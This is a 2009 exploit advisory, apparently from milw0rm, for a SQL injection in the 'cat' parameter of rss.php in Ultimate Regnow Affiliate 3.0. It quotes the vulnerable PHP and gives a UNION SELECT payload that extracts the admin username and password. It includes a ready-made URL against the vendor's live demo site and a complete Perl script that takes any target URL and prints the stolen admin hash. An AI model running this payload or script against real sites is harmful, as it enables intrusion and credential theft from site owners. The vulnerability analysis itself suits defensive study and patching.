@@ -1,0 +1,79 @@
+---------------------------------------------------
+URA 3.0 (cat) remote SQL injection Vulnerability
+---------------------------------------------------
+ ###################################################
+ [+] Author        :  Chip D3 Bi0s
+ [+] Email         :  chipdebios[alt+64]gmail.com
+ [+] Group         :  LatinHackTeam
+ [+] Vulnerability :  SQL injection
+ ###################################################
+
+---------info Cms----------------
+Name     : Ultimate Regnow Affiliate
+Email    : support@phpsugar.com
+Dowloand : http://www.phpsugar.com/ura_order.html
+Web      : http://www.phpsugar.com
+Price    : $27 USD
+---------------------------------
+
+vulnerable code in rss.php
+
+........
+7. $cat = $_GET['cat'];
+8. 
+9. if(empty($cat)) {
+10 .$query = "SELECT ProductID, ProductName, VendorName, LongDesc FROM ura_items WHERE CategoryID != 0 AND CategoryID != 1 AND CategoryID != 2 ORDER BY Add_Date DESC LIMIT 10";
+11. }
+12. else { 
+13. $query = "SELECT * FROM ura_items WHERE CategoryID = $cat ORDER BY Add_Date DESC limit $no";
+14. }
+
+.....
+	
+example of exploitation:
+http://localhost/path/rss.php?cat=0[Sql-Code]
+
+[Sql-Code]:
++union+select+1,concat(username,0x3a,pass),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20+from+ura_settings/*
+
+live Demo: 
+http://www.phpsugar.com/ura_demo/rss.php?cat=0+union+select+1,concat(username,0x3a,pass),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20+from+ura_settings/*
+
+.....
+
+#!/usr/bin/perl -w
+########################################
+#[+] Author : Chip D3 Bi0s
+#[+] Contact: chipdebios[alt+64]gmail.com 
+########################################
+print "\t\t--------------------------------------------------\n\n";
+print "\t\t|                  ---|Chip D3 Bi0s|---           |\n\n";
+print "\t\t---------------------------------------------------\n\n";
+print "\t\t|URA 3.0 (cat) remote SQL injection Vulnerability |  \n\n";
+print "\t\t---------------------------------------------------\n\n";
+use LWP::UserAgent;
+print "\nEnter url of vuln site [http://wwww.example.com/path]: ";
+chomp(my $target=<STDIN>);
+$column_name="concat(0x215F,username,char(58),pass,0x215F)";
+$table_name="ura_settings";
+$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
+$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+$host = $target . "/rss.php?cat=0+union+select+1,".$column_name.",3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20+from/**/".$table_name."/*";
+$res = $b->request(HTTP::Request->new(GET=>$host));
+$answer = $res->content;
+if($answer =~ /!_(.+?)!_/i)
+{
+     print "\n[+] Admin Hash : $1\n\n";
+     print "> Exploit done! <\n\n";
+
+}
+
+
+else{print "\n> Exploit failed! <\n";
+}
+
+#+++++++++++++++++++++++++++++++++
+#[!] Produced in South America
+#---------------------------------
+
+# milw0rm.com [2009-07-27]
